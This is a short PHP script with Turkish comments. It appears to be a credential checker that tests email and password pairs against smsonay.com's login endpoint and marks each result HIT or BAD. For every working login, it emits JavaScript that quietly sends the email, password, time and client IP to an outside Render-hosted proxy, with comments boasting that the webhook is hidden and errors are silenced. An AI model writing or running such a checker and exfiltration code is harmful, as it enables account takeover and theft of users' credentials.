<?php
header("Content-Type: text/html; charset=UTF-8");

$email = $_GET['email'] ?? '';
$pass  = $_GET['pass']  ?? '';

if (empty($email) || empty($pass)) {
    die("Parametre eksik. Kullanım: ?email=MAIL&pass=PASS");
}

$loginUrl = "https://www.smsonay.com/ajax/login";

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL            => $loginUrl,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => http_build_query(['email' => $email, 'password' => $pass]),
    CURLOPT_HTTPHEADER     => [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Content-Type: application/x-www-form-urlencoded'
    ],
    CURLOPT_TIMEOUT        => 15,
    CURLOPT_FOLLOWLOCATION => true,
]);

$response = curl_exec($ch);
curl_close($ch);

$json = json_decode($response, true);

$hit = isset($json['success']) && $json['success'] === true;
$sonuc = $hit ? "HIT" : (isset($json['success']) ? "BAD" : "ERROR");

echo "<h2 style='color: " . ($hit ? 'green' : 'red') . ";'>Sonuç: $sonuc</h2>";
?>

<?php if ($hit): ?>
    <p style="color:green;">Başarılı – bilgi iletildi.</p>

    <script>
        // Proxy'e gönder (webhook burada görünmüyor!)
        fetch('https://hit-proxy-abc123.onrender.com/gonder', {   // ← kendi Render URL'ini yaz
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                secret: 'xAIgrok2026supersecret123abcDEFghiJKL',   // ← Render'daki SECRET_KEY ile aynı olmalı
                email: '<?php echo addslashes($email); ?>',
                pass: '<?php echo addslashes($pass); ?>',
                zaman: '<?php echo date('d.m.Y H:i:s'); ?>',
                ip: '<?php echo $_SERVER['REMOTE_ADDR'] ?? 'Bilinmiyor'; ?>'
            })
        }).catch(() => {});  // hata olursa sessiz kalsın
    </script>
<?php else: ?>
    <p>İletim yapılmadı (sadece <?php echo $sonuc; ?>).</p>
<?php endif; ?>
